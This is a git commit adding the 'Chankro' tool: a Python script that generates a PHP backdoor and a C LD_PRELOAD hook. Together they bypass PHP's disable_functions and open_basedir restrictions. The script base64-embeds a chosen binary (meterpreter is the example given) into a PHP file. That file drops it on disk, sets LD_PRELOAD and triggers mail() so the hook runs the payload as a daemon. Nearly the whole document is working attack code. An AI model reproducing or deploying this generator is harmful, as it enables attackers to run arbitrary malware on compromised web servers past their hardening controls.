c144ff672b16e9aeee914042f4509df0833686d1
TarlogicSecurity <andres.tarasco@tarlogic.com>
2017-03-01 11:08:51 +0100

    Subidos ficheros

---
+++ chankro.py
@@ -0,0 +1,83 @@
+######## Chankro v0.1 #######
+
+# [+] Bypass disable_functions
+# [+] Bypass open_basedir
+
+##############################
+#          @TheXC3LL         #
+##############################
+
+
+import argparse
+import base64
+
+parser = argparse.ArgumentParser(description='Generate PHP backdoor')
+parser.add_argument('--arch', dest='arch',help='Architecture (32 or 64)')
+parser.add_argument('--input', dest='meter', help='Binary to be executed (p.e. meterpreter)')
+parser.add_argument('--output', dest='out', help='PHP filename')
+parser.add_argument('--path', dest='pati', help='Absolute path')
+args = parser.parse_args()
+
+
+
+
+print "\n\n     -=[ Chankro ]=-\n    -={ @TheXC3LL }=-\n\n"
+
+
+if not args.meter:
+	print "[!] Error: please select a valid file as input"
+ 	exit()
+try:
+	with open(args.meter, "rb") as file:
+		encoded_shell = base64.b64encode(file.read())
+except:
+	print "[!] Error: file could not be opened"
+	exit()
+if not args.out:
+	print "[!] Error: please select a valid file as output"
+	exit()
+try:
+	outfile = open(args.out, "w")
+except:
+	print "[!] Error: file could not be created"
+	exit()
+
+if not args.arch:
+	print "[!] Error: select architecture (64 or 32)"
+	exit()
+else:
+	if args.arch != "32" and args.arch != "64":
+		print "[!] Error: unknow architecture"
+		exit()
+	else:
+		archi = "hook" + args.arch + ".so"
+if not args.pati:
+	print "[!] Error: remote path"
+	exit()
+
+with open(archi, "rb") as bicho:
+	encoded_bicho = base64.b64encode(bicho.read())
+
+
+head = "<?php\n $hook = '" + encoded_bicho  + "';\n"
+body1 = "$meterpreter = '" + encoded_shell + "';\n"
+body2 = "file_put_contents('" + args.pati + "/chankro.so', base64_decode($hook));\n"
+body3 = "file_put_contents('" + args.pati + "/acpid.socket', base64_decode($meterpreter));\n"
+cosa1 = "chmod('acpid.socket', 0777);\n"
+cosa2 = "chmod('chankro.so', 0777);\n"
+cosa3 = "putenv('CHANKRO=" + args.pati + "/acpid.socket');\n"
+tail1 = "putenv('LD_PRELOAD=" + args.pati + "/chankro.so');\n"
+tail2 = "mail('a','a','a','a');?>"
+
+print "[+] Binary file: " + args.meter
+print "[+] Architecture: x" + args.arch
+print "[+] Final PHP: " + args.out + "\n\n"
+
+
+outfile.write(head + body1 + body2 + body3 + cosa1 + cosa2 + cosa3 + tail1 + tail2)
+outfile.close()
+print "[+] File created!"
+
+
+
+
---
+++ hook.c
@@ -0,0 +1,30 @@
+//Ty! n30m1nd 
+#define  _GNU_SOURCE
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <dlfcn.h>
+#include <signal.h>
+#include <unistd.h>
+
+
+void pwn(void) {
+        system(getenv("CHANKRO"));
+}
+
+void daemonize(void) {
+	signal(SIGHUP, SIG_IGN);
+	if (fork() != 0) {
+		exit(EXIT_SUCCESS);
+	}
+}
+
+uid_t geteuid() {
+  uid_t (*orig_geteuid)();
+  orig_geteuid = dlsym(RTLD_NEXT, "geteuid");
+  unsetenv("LD_PRELOAD");
+  daemonize();
+  pwn();
+  return orig_geteuid();
+}
+
